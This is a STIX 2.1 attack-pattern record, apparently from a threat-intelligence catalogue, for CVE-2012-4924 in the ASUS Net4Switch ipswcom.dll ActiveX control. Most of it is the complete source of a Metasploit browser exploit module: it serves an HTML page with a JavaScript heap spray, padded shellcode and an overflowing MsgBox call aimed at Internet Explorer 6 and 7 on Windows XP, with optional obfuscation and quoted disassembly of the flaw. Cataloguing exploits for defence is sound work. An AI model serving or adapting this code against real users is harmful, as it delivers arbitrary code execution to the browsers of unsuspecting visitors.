{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c5b05668-deee-4337-8791-885d8a94e262",
    "created": "2024-08-14T16:41:19.608377Z",
    "modified": "2024-08-14T16:41:19.608381Z",
    "name": "\"ASUS Net4Switch ipswcom.dll ActiveX Stack Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in ASUS Net4Switch's ipswcom.dll ActiveX control.  A buffer overflow condition is possible in multiple places due to the use of the CxDbgPrint() function, which allows remote attackers to gain arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/asus_net4switch_ipswcom.rb",
            "external_id": "asus_net4switch_ipswcom.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4924"
        },
        {
            "source_name": "reference",
            "url": "http://dsecrg.com/pages/vul/show.php?id=417"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ASUS Net4Switch ipswcom.dll ActiveX Stack Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in ASUS Net4Switch's ipswcom.dll\n        ActiveX control.  A buffer overflow condition is possible in multiple places due\n        to the use of the CxDbgPrint() function, which allows remote attackers to gain\n        arbitrary code execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Dmitriy Evdokimov', #Initial discovery, poc\n          'sinn3r'             #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4924' ],\n          [ 'OSVDB', '79438' ],\n          [ 'URL', 'http://dsecrg.com/pages/vul/show.php?id=417' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'         => \"seh\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', { 'Max' => '0x40000', 'Offset' => '0x500' } ],\n          [ 'IE 7 on Windows XP SP3', { 'Max' => '0x40000', 'Offset' => '0x500' } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-02-17',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n      ])\n  end\n\n  def get_target(agent)\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    p = payload.encoded\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    nops = Rex::Text.to_unescape(make_nops(4))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n\n    for (var i=1; i < 0x300; i++) {\n      heap_obj.alloc(block);\n    }\n    JS\n\n    spray = heaplib(spray, {:noobfu => true})\n\n    js = <<-JS\n    var obj = new ActiveXObject(\"ipswcom.IPSWComItf\");\n\n    #{spray}\n\n    function generate_padding(d, s) {\n      var tmp = d;\n      while (tmp.length < s) {\n        tmp += tmp;\n      }\n      var buf = tmp.substring(0, s/2);\n      tmp = null;\n      return buf;\n    }\n\n    var arg1 = generate_padding(unescape(\"%u4141\"), 4);\n\n    var arg2 = \"A\"; // Expands to 0x0041, helps us to align the stack\n    arg2 += generate_padding(unescape(\"%u4343\"), 2680);\n    arg2 += unescape(\"%u4242%u4242\");\n    arg2 += unescape(\"%u0d0d%u0d0d\");\n    arg2 += generate_padding(unescape(\"%u0d0d\"), #{my_target['Max']}-arg2.length);\n\n    obj.MsgBox(arg1, arg2, 2);\n    JS\n\n    #obfuscate on demand\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    html = <<-EOS\n    <html>\n    <head>\n    </head>\n    <body>\n    <script>\n    #{js}\n    </script>\n    </body>\n    </html>\n    EOS\n\n    html = html.gsub(/\\t\\t/, '')\n\n    print_status(\"Sending HTML\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\nend\n\n=begin\nDownload:\nhttp://www.softpedia.com/progDownload/ASUS-Net4Switch-Download-203619.html\n\nclsid:1B9E86D8-7CAF-46C8-9938-569B21E17A8E\nC:\\Program Files\\ASUS\\Net4Switch\\ipswcom.dll\n\n.text:10030523                 push    ecx\n.text:10030524                 mov     eax, [ebp+arg_C]\n.text:10030527                 mov     [ebp+var_4], eax\n.text:1003052A                 cmp     [ebp+var_4], 0\n.text:1003052E                 jz      short loc_10030541  <-- uType 10h\n.text:10030530                 cmp     [ebp+var_4], 1\n.text:10030534                 jz      short loc_10030573  <-- uType 44h\n.text:10030536                 cmp     [ebp+var_4], 2\n.text:1003053A                 jz      short loc_100305A5  <-- CxDbgPrint\n...\n.text:100305A5 loc_100305A5:                           ; CODE XREF: MsgBox+1A\u0018j\n.text:100305A5                 mov     eax, [ebp+lpText]\n.text:100305A8                 push    eax\n.text:100305A9                 push    offset aIpsw_alertS ; \"[IPSW_alert] = %s\"\n.text:100305AE                 push    0FFh\n.text:100305B3                 call    ds:CxDbgPrint\n=end\n",
    "x_mitre_disclosure_date": "2012-02-17",
    "x_mitre_platforms": [
        "win'"
    ]
}